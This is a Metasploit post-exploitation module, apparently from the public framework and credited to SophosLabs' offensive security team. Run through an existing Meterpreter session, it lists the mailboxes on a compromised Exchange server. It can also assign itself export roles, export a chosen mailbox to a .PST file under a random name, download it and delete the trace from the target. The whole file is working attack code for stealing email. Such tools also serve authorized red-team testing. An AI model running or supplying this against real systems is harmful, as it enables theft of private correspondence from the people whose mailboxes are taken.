##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'readline'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Powershell
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Exchange Server Mailboxes',
        'Description' => %q{
          This module will gather information from an on-premise Exchange Server running on the target machine.

          Two actions are supported:
          LIST (default action): List basic information about all Exchange servers and mailboxes hosted on the target.
          EXPORT: Export and download a chosen mailbox in the form of a .PST file, with support for an optional filter keyword.

          For a list of valid filters, see https://docs.microsoft.com/en-us/exchange/filterable-properties-for-the-contentfilter-parameter

          The executing user has to be assigned to the "Organization Management" role group for the module to successfully run.

          Tested on Exchange Server 2010 on Windows Server 2012 R2 and Exchange Server 2016 on Windows Server 2016.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'SophosLabs Offensive Security team' ],
        'References' => [
          [ 'URL', 'https://github.com/sophoslabs/metasploit_gather_exchange' ],
          [ 'URL', 'https://news.sophos.com/en-us/2021/03/09/sophoslabs-offensive-security-releases-post-exploitation-tool-for-exchange/' ],
        ],
        'Platform' => [ 'win' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'meterpreter' ],
        'Actions' => [
          [ 'LIST', { 'Description' => 'List basic information about all Exchange servers and mailboxes hosted on the target' } ],
          [ 'EXPORT', { 'Description' => 'Export and download a chosen mailbox in the form of a .PST file, with support for an optional filter keyword' } ],
        ],
        'DefaultAction' => 'LIST'
      )
    )

    register_options(
      [
        OptString.new('FILTER', [ false, '[for EXPORT] Filter to use when exporting a mailbox (see description)' ]),
        OptString.new('MAILBOX', [ false, '[for EXPORT, required] Mailbox to export' ]),
      ]
    )

    register_advanced_options(
      [
        OptInt.new('TIMEOUT', [true, 'The maximum time (in seconds) to wait for any Powershell scripts to complete', 600])
      ]
    )
  end

  def execute_exchange_script(command)
    base_script = File.read(File.join(Msf::Config.data_directory, 'post', 'powershell', 'exchange.ps1'))
    # A hash is used as the replacement argument to avoid issues with backslashes in command
    psh_script = base_script.sub('_COMMAND_', '_COMMAND_' => command)
    compressed_script = compress_script(psh_script)
    cmd_out, _runnings_pids, _open_channels = execute_script(compressed_script, datastore['TIMEOUT'])
    while (d = cmd_out.channel.read)
      # Only print the output coming from PowerShell that is inside <output> tags
      d.scan(%r{<output>(.*?)</output>}) do |b|
        b[0].split('<br>') do |l|
          print_line(l.to_s)
        end
      end
    end
  end

  def export_mailboxes(mailbox, filter)
    # Get the target's TEMP path and generate a random filename to serve as the save path for the export action
    temp_folder = get_env('TEMP')
    random_filename = "#{Rex::Text.rand_text_alpha(16)}.tmp"
    temp_save_path = "#{temp_folder}\\#{random_filename}"

    # The Assign-Roles command is responsible for assigning the roles necessary for exporting,
    # It's executed in a separate PowerShell session because these changes don't take effect until a new session is created
    execute_exchange_script('Assign-Roles')
    execute_exchange_script("Export-Mailboxes \"#{mailbox}\" \"#{filter}\" \"#{temp_save_path}\"")

    # After script is done executing, check if the export save path exists on the target
    if !file_exist?(temp_save_path)
      print_error('Export file not created on target machine. Aborting.')
      return
    end

    # Get the size of the newly made export file
    stat = session.fs.file.stat(temp_save_path)
    mb_size = (stat.stathash['st_size'] / 1024.0 / 1024.0).round(2)
    print_status("Resulting export file size: #{mb_size} MB")
    if mb_size > 50
      print_warning('The resulting export file is large. You can reduce it by using the FILTER option to refine the amount of exported mail items.')

      loop do
        input = Readline.readline('Are you sure you want to download it? [Y/N]: ', true)
        if input.casecmp('Y') == 0
          break
        elsif input.casecmp('N') == 0
          print_error('Aborting download')
          rm_f(temp_save_path)
          return
        end
      end
    end

    # Download file using the loot system
    loot = store_loot('PST', 'application/vnd.ms-outlook', session, read_file(temp_save_path), 'export.pst', "PST export of mailbox #{mailbox}")
    print_good("PST saved in: #{loot}")

    # Delete file from target
    rm_f(temp_save_path)
  end

  def list_mailboxes
    execute_exchange_script('List-Mailboxes')
  end

  def run
    # Check if Exchange Server is installed on the target by checking the registry
    if registry_key_exist?('HKLM\\Software\\Microsoft\\ExchangeServer')
      print_good('Exchange Server is present on target machine')
    else
      fail_with(Failure::Unknown, 'Exchange Server is not present on target machine')
    end

    # Check if PowerShell is installed on the target
    if have_powershell?
      print_good('PowerShell is present on target machine')
    else
      fail_with(Failure::Unknown, 'PowerShell is not present on target machine')
    end

    mailbox = datastore['MAILBOX']
    filter = datastore['FILTER']

    case action.name
    when 'LIST'
      print_good('Listing reachable servers and mailboxes: ')
      list_mailboxes
    when 'EXPORT'
      if mailbox.nil? || mailbox.empty?
        fail_with(Failure::BadConfig, 'Option MAILBOX is required for action EXPORT')
      else
        print_good("Exporting mailbox '#{mailbox}': ")
        export_mailboxes(mailbox, filter)
      end
    else
      print_error("Unknown action: #{action.name}")
    end
  end
end
